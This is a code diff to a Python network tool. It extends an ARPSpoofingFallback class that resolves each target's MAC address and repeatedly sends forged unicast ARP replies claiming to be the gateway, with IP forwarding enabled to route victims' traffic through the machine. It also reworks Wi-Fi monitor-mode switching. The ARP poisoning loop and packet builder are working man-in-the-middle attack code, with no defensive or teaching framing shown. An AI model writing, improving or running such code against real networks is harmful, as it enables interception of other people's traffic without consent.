@@ -1682,6 +1682,46 @@ class ARPSpoofingFallback:
             else:
                 self.real_gateway_mac = match.group(1)
 
+            # Resolve target MAC addresses for unicast ARP spoofing (avoids switch ignoring broadcast ARP)
+            add_log('info', f'Resolving MAC addresses for {len(targets)} target(s) (unicast ARP spoofing)')
+            self.target_macs = {}  # Map target_ip → target_mac
+            for target_ip in targets:
+                mac = None
+                try:
+                    # Try arping first (more reliable for live hosts)
+                    try:
+                        result = subprocess.check_output(
+                            ['arping', '-c', '1', '-w', '1', target_ip],
+                            stderr=subprocess.PIPE, text=True, timeout=3
+                        )
+                        # arping output: "Unicast reply from X [YY:YY:YY:YY:YY:YY]"
+                        match = re.search(r'\[([0-9a-fA-F:]{17})\]', result)
+                        if match:
+                            mac = match.group(1)
+                    except:
+                        pass
+
+                    # Fallback: use arp -n command
+                    if not mac:
+                        result = subprocess.check_output(
+                            ['arp', '-n', target_ip],
+                            stderr=subprocess.PIPE, text=True, timeout=2
+                        )
+                        # arp output: "... at YY:YY:YY:YY:YY:YY [ether]"
+                        match = re.search(r'([0-9a-fA-F:]{17})', result)
+                        if match:
+                            mac = match.group(1)
+
+                    if mac:
+                        self.target_macs[target_ip] = mac
+                        add_log('dev', f'Target {target_ip} → MAC {mac} (unicast ARP will be used)')
+                    else:
+                        add_log('warn', f'Could not resolve MAC for {target_ip}; will use broadcast fallback for this target')
+                        self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
+                except Exception as e:
+                    add_log('warn', f'Error resolving MAC for {target_ip}: {e}; using broadcast fallback')
+                    self.target_macs[target_ip] = 'ff:ff:ff:ff:ff:ff'
+
             # Enable IP forwarding
             self._enable_ip_forwarding()
 
@@ -1753,6 +1793,7 @@ class ARPSpoofingFallback:
         """Continuously send ARP replies claiming to be the gateway.
 
         This makes target devices think we are the gateway, routing traffic through us.
+        Uses unicast ARP when MAC is known (preferred), broadcast as fallback.
         """
         try:
             # Build ARP reply packet: we claim to own the gateway IP
@@ -1762,25 +1803,38 @@ class ARPSpoofingFallback:
             while self.active:
                 for target_ip in targets:
                     try:
-                        # ARP reply: we are gateway_ip
-                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip)
+                        # Get target MAC for unicast ARP (or use broadcast if unknown)
+                        target_mac = self.target_macs.get(target_ip, 'ff:ff:ff:ff:ff:ff')
+
+                        # ARP reply: we are gateway_ip, send unicast to target
+                        packet = self._build_arp_reply(src_mac_bytes, gateway_ip, target_ip, target_mac)
                         success, method, error = SocketProxy.send_packet(packet, iface)
                         if not success:
-                            add_log('warn', f'ARP spoof to {target_ip} failed ({method}): {error}')
+                            add_log('warn', f'ARP spoof to {target_ip} ({target_mac}) failed ({method}): {error}')
                         else:
-                            add_log('dev', f'ARP spoof to {target_ip} via {method}')
+                            pkt_type = 'unicast' if target_mac != 'ff:ff:ff:ff:ff:ff' else 'broadcast'
+                            add_log('dev', f'ARP spoof to {target_ip} ({pkt_type}) via {method}')
                     except Exception as e:
                         add_log('warn', f'ARP spoof to {target_ip} exception: {e}')
 
-                time.sleep(2)  # Re-spoof every 2 seconds to maintain cache
+                time.sleep(2)  # Re-spoof every 2 seconds to maintain ARP cache
 
         except Exception as e:
             add_log('error', f'ARP spoofing loop failed: {e}')
 
-    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str) -> bytes:
-        """Build raw ARP reply packet."""
+    def _build_arp_reply(self, src_mac: bytes, gateway_ip: str, target_ip: str, target_mac_str: str = 'ff:ff:ff:ff:ff:ff') -> bytes:
+        """Build raw ARP reply packet.
+
+        Args:
+            src_mac: Our MAC address as bytes
+            gateway_ip: Gateway IP we're spoofing
+            target_ip: Target device IP
+            target_mac_str: Target MAC address (unicast) or 'ff:ff:ff:ff:ff:ff' (broadcast fallback)
+        """
+        # Parse target MAC (unicast or broadcast)
+        dst_mac = bytes.fromhex(target_mac_str.replace(':', ''))
+
         # Ethernet header
-        dst_mac = bytes.fromhex('ffffffffffff')  # Broadcast
         frame_type = struct.pack('!H', 0x0806)  # ARP
 
         # ARP packet
@@ -1788,15 +1842,17 @@ class ARPSpoofingFallback:
         proto_type = struct.pack('!H', 0x0800)  # IPv4
         hw_len = struct.pack('!B', 6)  # MAC length
         proto_len = struct.pack('!B', 4)  # IP length
-        operation = struct.pack('!H', 2)  # Reply
+        operation = struct.pack('!H', 2)  # Reply (not Request)
 
         # Convert IPs to bytes
         gw_bytes = socket.inet_aton(gateway_ip)
         target_bytes = socket.inet_aton(target_ip)
 
+        # ARP reply: sender = us (claiming to be gateway), target = destination device
         arp_packet = (hw_type + proto_type + hw_len + proto_len + operation +
                       src_mac + gw_bytes + dst_mac + target_bytes)
 
+        # Ethernet frame: [dst_mac][src_mac][frame_type][arp_packet]
         return dst_mac + src_mac + frame_type + arp_packet
 
     def disable_arp_spoofing(self):
@@ -3007,25 +3063,139 @@ def get_ngrok_public_url():
         return None
 
 # ---------- monitor mode ----------
-def set_monitor(iface, enable=True, raise_on_fail=False):
-    """Attempt to set monitor mode. Returns True on success, False otherwise."""
-    mode = 'monitor' if enable else 'managed'
+# Global state for Wi-Fi restoration
+_wifi_state = {'ssid': None, 'bssid': None, 'freq': None}
+
+def _save_wifi_state(iface):
+    """Save current Wi-Fi network info before switching to monitor mode."""
+    global _wifi_state
     try:
-        subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
-                       check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
-        if enable:
-            time.sleep(0.5)
-            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True)
-            if 'type monitor' not in out:
-                raise RuntimeError(f'Failed to set monitor mode on {iface}')
+        # Try to get current connection info via iw
+        out = subprocess.check_output(['iw', 'dev', iface, 'link'], text=True, stderr=subprocess.PIPE)
+        for line in out.split('\n'):
+            if 'SSID:' in line:
+                _wifi_state['ssid'] = line.split('SSID:')[1].strip()
+            elif 'freq:' in line:
+                _wifi_state['freq'] = line.split('freq:')[1].strip().split()[0]
+        add_log('dev', f'Saved Wi-Fi state: SSID={_wifi_state.get("ssid")}, freq={_wifi_state.get("freq")}')
         return True
-    except subprocess.CalledProcessError as e:
-        if raise_on_fail:
-            raise RuntimeError(f'Monitor mode change failed (exit {e.returncode}). Interface may not support monitor mode.')
+    except:
+        add_log('dev', 'Could not save Wi-Fi state (interface may be disconnected)')
+        return False
+
+def _restore_wifi_state(iface):
+    """Attempt to restore Wi-Fi connection after switching back to managed mode."""
+    global _wifi_state
+    if not _wifi_state.get('ssid'):
+        add_log('dev', 'No saved Wi-Fi state to restore')
+        return False
+
+    try:
+        # Wait a moment for interface to stabilize
+        time.sleep(1)
+
+        # Try nmcli if available (preferred method)
+        try:
+            subprocess.run(['nmcli', 'device', 'wifi', 'connect', _wifi_state['ssid']],
+                         timeout=10, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            add_log('success', f'Restored Wi-Fi connection to {_wifi_state["ssid"]} via nmcli')
+            return True
+        except:
+            pass
+
+        # Fallback: try wpa_cli reconnect
+        try:
+            subprocess.run(['wpa_cli', '-i', iface, 'reconnect'],
+                         timeout=5, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
+            add_log('success', f'Restored Wi-Fi connection to {_wifi_state["ssid"]} via wpa_cli')
+            return True
+        except:
+            pass
+
+        add_log('warn', f'Failed to restore Wi-Fi connection to {_wifi_state["ssid"]} -- manual reconnection may be needed')
         return False
     except Exception as e:
+        add_log('warn', f'Error restoring Wi-Fi: {e}')
+        return False
+
+def set_monitor(iface, enable=True, raise_on_fail=False):
+    """Set monitor mode with proper interface lifecycle management.
+
+    - Enables: save Wi-Fi state → down → set monitor → up
+    - Disables: down → set managed → up → restore Wi-Fi
+    """
+    mode = 'monitor' if enable else 'managed'
+    try:
+        if enable:
+            # Before switching to monitor, save Wi-Fi state
+            _save_wifi_state(iface)
+
+            # Bring interface down
+            add_log('dev', f'Bringing {iface} down before monitor mode switch')
+            subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+            time.sleep(0.3)
+
+            # Switch to monitor mode
+            add_log('dev', f'Switching {iface} to monitor mode')
+            subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+
+            # Bring interface back up
+            add_log('dev', f'Bringing {iface} up')
+            subprocess.run(['ip', 'link', 'set', iface, 'up'],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+
+            # Verify monitor mode is active
+            time.sleep(0.5)
+            out = subprocess.check_output(['iw', 'dev', iface, 'info'], text=True, timeout=5)
+            if 'type monitor' not in out:
+                raise RuntimeError(f'Failed to set monitor mode on {iface}')
+
+            add_log('success', f'Monitor mode enabled on {iface}')
+            return True
+        else:
+            # Bring interface down
+            add_log('dev', f'Bringing {iface} down before managed mode switch')
+            subprocess.run(['ip', 'link', 'set', iface, 'down'],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+            time.sleep(0.3)
+
+            # Switch to managed mode
+            add_log('dev', f'Switching {iface} to managed mode')
+            subprocess.run(['iw', 'dev', iface, 'set', 'type', mode],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+
+            # Bring interface back up
+            add_log('dev', f'Bringing {iface} up')
+            subprocess.run(['ip', 'link', 'set', iface, 'up'],
+                         check=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE, timeout=5)
+
+            time.sleep(0.5)
+            add_log('success', f'Monitor mode disabled on {iface}, switched to managed')
+
+            # Attempt to restore Wi-Fi connection
+            _restore_wifi_state(iface)
+            return True
+
+    except subprocess.CalledProcessError as e:
+        err = e.stderr.decode(errors='ignore') if e.stderr else str(e)
+        msg = f'Monitor mode change failed (exit {e.returncode}, {err.strip()[-100:]}). Interface may not support monitor mode.'
         if raise_on_fail:
-            raise RuntimeError(str(e))
+            raise RuntimeError(msg)
+        add_log('error', msg)
+        return False
+    except subprocess.TimeoutExpired:
+        msg = f'Monitor mode change timed out on {iface}'
+        if raise_on_fail:
+            raise RuntimeError(msg)
+        add_log('error', msg)
+        return False
+    except Exception as e:
+        msg = f'Monitor mode error: {str(e)}'
+        if raise_on_fail:
+            raise RuntimeError(msg)
+        add_log('error', msg)
         return False
 
 def check_monitor_mode_ioctl(iface):
